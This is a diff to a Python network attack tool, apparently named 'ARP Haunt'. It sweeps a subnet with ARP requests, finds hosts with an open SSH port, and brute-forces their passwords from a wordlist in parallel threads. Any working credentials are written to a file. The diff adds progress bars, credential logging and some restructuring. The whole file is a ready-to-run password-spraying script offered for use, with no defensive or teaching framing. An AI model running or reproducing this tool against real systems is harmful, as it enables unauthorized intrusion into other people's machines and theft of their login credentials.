@@ -6,100 +6,103 @@ import sys
 import socket
 import paramiko
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from tqdm import tqdm  # Progress bar
+import time
 
 class stl():
-    BLK = '\033[30m'
     RED = '\033[31m'
     GRN = '\033[32m'
-    YLW = '\033[33m'
     BLU = '\033[34m'
-    MGN = '\033[35m'
     CYN = '\033[36m'
-    WHT = '\033[37m'
-    UNDR = '\033[4m'
     RST = '\033[0m'
-
-trim0 = "═" * 54
+    MGN = '\033[35m'
+    YLW = '\033[33m'
 
 print(f"""
-{stl.MGN}╔{trim0}╗{stl.RST}
-{stl.MGN}║{stl.RED}     ▄▄▄· ▄▄▄   ▄▄▄·     ▄ .▄ ▄▄▄· ▄• ▄▌ ▐ ▄ ▄▄▄▄▄    {stl.MGN}║{stl.RST}
-{stl.MGN}║{stl.RED}    ▐█ ▀█ ▀▄ █·▐█ ▄█    ██▪▐█▐█ ▀█ █▪██▌•█▌▐█•██      {stl.MGN}║{stl.RST}
-{stl.MGN}║{stl.RED}    ▄█▀▀█ ▐▀▀▄  ██▀·    ██▀▐█▄█▀▀█ █▌▐█▌▐█▐▐▌ ▐█.▪    {stl.MGN}║{stl.RST}
-{stl.MGN}║{stl.RED}    ▐█ ▪▐▌▐█•█▌▐█▪·•    ██▌▐▀▐█ ▪▐▌▐█▄█▌██▐█▌ ▐█▌·    {stl.MGN}║{stl.RST}
-{stl.MGN}║{stl.RED}     ▀  ▀ .▀  ▀.▀       ▀▀▀ · ▀  ▀  ▀▀▀ ▀▀ █▪ ▀▀▀     {stl.MGN}║{stl.RST}
-{stl.MGN}╚{trim0}╝{stl.RST}
+{stl.MGN}╔════════════════════════════════════════════════╗{stl.RST}
+{stl.MGN}║{stl.RED}  ▄▄▄· ▄▄▄   ▄▄▄·     ▄ .▄ ▄▄▄· ▄• ▄▌ ▐ ▄ ▄▄▄▄▄ {stl.MGN}║═╗{stl.RST}
+{stl.MGN}║{stl.RED} ▐█ ▀█ ▀▄ █·▐█ ▄█    ██▪▐█▐█ ▀█ █▪██▌•█▌▐█•██   {stl.MGN}║ ║{stl.RST}
+{stl.MGN}║{stl.RED} ▄█▀▀█ ▐▀▀▄  ██▀·    ██▀▐█▄█▀▀█ █▌▐█▌▐█▐▐▌ ▐█.▪ {stl.MGN}║ ║{stl.RST}
+{stl.MGN}║{stl.RED} ▐█ ▪▐▌▐█•█▌▐█▪·•    ██▌▐▀▐█ ▪▐▌▐█▄█▌██▐█▌ ▐█▌· {stl.MGN}║ ║{stl.RST}
+{stl.MGN}║{stl.RED}  ▀  ▀ .▀  ▀.▀       ▀▀▀ · ▀  ▀  ▀▀▀ ▀▀ █▪ ▀▀▀  {stl.MGN}║ ║{stl.RST}
+{stl.MGN}║{stl.RED}                                         v1.0   {stl.MGN}║ ║{stl.RST}
+{stl.MGN}╚════════════════════════════════════════════════╝{stl.MGN} ║{stl.RST}
+{stl.MGN} ║{stl.RED}    #m0d3ls!           aurora.yiff.fi            {stl.MGN}║{stl.RST}
+{stl.MGN} ╚═════════════════════════════════════════════════╝{stl.RST}
 """)
 
 if os.geteuid() != 0:
-    sys.exit(f"[{stl.RED}-{stl.RST}] Must run as suP3rStaR(SUDO)!!!!11")
+    sys.exit(f"[{stl.RED}-{stl.RST}] Must run as sudo!")
 
 target_ip = input(f"[{stl.BLU}*{stl.RST}] IP range (192.168.0.0/24): ") or "192.168.0.0/24"
 port = int(input(f"[{stl.BLU}*{stl.RST}] Port (22): ") or 22)
-list = input(f"[{stl.BLU}*{stl.RST}] wordlist (funlist): ") or "funlist"
-username = input(f"[{stl.BLU}*{stl.RST}] username (h4x3r666): ") or "h4x3r666"
-wordlist = open(list)
+list_file = input(f"[{stl.BLU}*{stl.RST}] Wordlist (funlist): ") or "funlist"
+username = input(f"[{stl.BLU}*{stl.RST}] Username (h4x0r1337): ") or "h4x0r1337"
+wordlist = open(list_file)
+login_file = "successful_logins.txt"
+timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+if not os.path.exists(login_file):
+    with open(login_file, 'w') as file:
+        file.write("Timestamp - IP:Port - Username:Password\n")
+    print(f"[{stl.BLU}*{stl.RST}] Created {login_file}")
 
 def scan(ip):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    print(f"[{stl.BLU}*{stl.RST}] Starting ARP scan on {ip} : {port} with {username} & {list} at {stl.CYN}{timestamp}{stl.RST}\n")
+    print(f"\n[{stl.BLU}*{stl.RST}] ARP-Haunting {stl.MGN}{target_ip}{stl.RST} as {stl.YLW}{username}{stl.RST} on port {stl.MGN}{port}{stl.RST} started @ {stl.CYN}{timestamp}{stl.RST}")
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
-    results = []
-    for element in answered_list:
-        result = {"ip": element[1].psrc, "mac": element[1].hwsrc}
-        results.append(result)
+    answered_list = scapy.srp(broadcast / arp_request, timeout=2, verbose=False)[0]
+    results = [{"ip": e[1].psrc, "mac": e[1].hwsrc} for e in answered_list]
     return results
 
 def check_port(ip, port):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.settimeout(2)
-        try:
-            result = sock.connect_ex((ip, port))
-            return result == 0
-        except socket.error as e:
-            print(f"[{stl.RED}-{stl.RST}] Error checking {ip}:{port} - {e}")
-            return False
+        return sock.connect_ex((ip, port)) == 0
 
 def attempt_ssh_login(ip, port, username, password):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        ssh.connect(ip, port, username, password)
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        print(f"[{stl.GRN}+{stl.RST}] Success! {stl.GRN}{username}{stl.RST} + {stl.GRN}{password}{stl.RST} logged in {ip}:{port} at {stl.CYN}{timestamp}{stl.RST}")
+        ssh.connect(ip, port, username, password, timeout=5)
+        tqdm.write(f"[{stl.GRN}*{stl.RST}] Success!\t\t\t {stl.YLW}{username}{stl.RST}:{stl.YLW}{password}{stl.RST} @ {stl.CYN}{timestamp}{stl.RST}")
+        with open(login_file, 'a') as file:
+            file.write(f"{timestamp} - {ip}:{port} - {username}:{password}\n")
+            tqdm.write(f"[{stl.GRN}+{stl.RST}] File saved!")
         ssh.close()
         return True
-    except paramiko.AuthenticationException:  
-        print(f"[{stl.RED}-{stl.RST}] {ip}:{port} {username} & {password}\tNo joy!")
+    except paramiko.AuthenticationException:
+        tqdm.write(f"[{stl.RED}-{stl.RST}] No joy!\t\t\t {stl.YLW}{username}{stl.RST}:{stl.YLW}{password}{stl.RST}")
     except socket.timeout:
-        print(f"[{stl.RED}-{stl.RST}] Timeout connecting to {ip}:{port}.")
+        tqdm.write(f"[{stl.RED}-{stl.RST}] Timeout connecting to\t {ip}:{port}.")
     ssh.close()
     return False
 
-def display_results(results, port):
-    for result in results:
-        ip = result["ip"]
-        mac = result["mac"]
-        print(f"[{stl.BLU}*{stl.RST}] IP: {ip}\t\t\t MAC: {mac}")
-        if check_port(ip, port):
-            with open(list, 'r') as fp:
-                lines = len(fp.readlines())
-            print(f"[{stl.GRN}*{stl.RST}] Found open! {ip}:{port} Spraying with username {stl.BLU}{username}{stl.RST} & {stl.BLU}{list}{stl.RST} ({lines} lines) wordlist.")
-            try:
-                with open(list, 'r') as wordlist:
-                    for password in wordlist.readlines():
-                        password = password.strip("\n")
-                        if attempt_ssh_login(ip, port, username, password):
-                            break
-            except Exception as e:
-                print(f"[{stl.RED}-{stl.RST}] Error processing IP {ip}: {e}")
+def process_host(ip, mac, position):
+    print(f"[{stl.BLU}*{stl.RST}] Found:\t\t\t {stl.MGN}{ip}{stl.RST}\t\t ({mac})")
+    if check_port(ip, port):
+        print(f"[{stl.GRN}+{stl.RST}] Open:\t\t\t {stl.GRN}{ip}{stl.RST}:{stl.GRN}{port}{stl.RST} \t attempting login...\n")
+        with open(list_file, 'r') as wordlist:
+            for password in tqdm(wordlist.readlines(), desc=f"Brute-forcing {ip}", unit="pwd", dynamic_ncols=True, colour="red", position=position + 1, leave=False):
+                if attempt_ssh_login(ip, port, username, password.strip()):
+                    break
 
-scan_results = scan(target_ip)
-display_results(scan_results, port)
+def main():
+    start_time = time.time()
+    scan_results = scan(target_ip)
+    if not scan_results:
+        print(f"[{stl.RED}-{stl.RST}] No devices found!")
+        return
+    print(f"[{stl.BLU}*{stl.RST}] {len(scan_results)} devices detected")
     
-with ThreadPoolExecutor(max_workers=5) as executor:
-    executor.map(display_results, scan_results)
+    with tqdm(total=len(scan_results), unit="host", colour="green", position=0, leave=False, bar_format="{desc}") as pbar:
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = {executor.submit(process_host, result["ip"], result["mac"], idx): result for idx, result in enumerate(scan_results)}
+            for future in as_completed(futures):
+                pbar.update(1)
+    
+    print(f"[{stl.BLU}*{stl.RST}] Scan completed at\t\t {stl.CYN}{timestamp}{stl.RST}\t Total time: {stl.CYN}{time.time() - start_time:.2f}s{stl.RST}")
+
+if __name__ == "__main__":
+    main()  
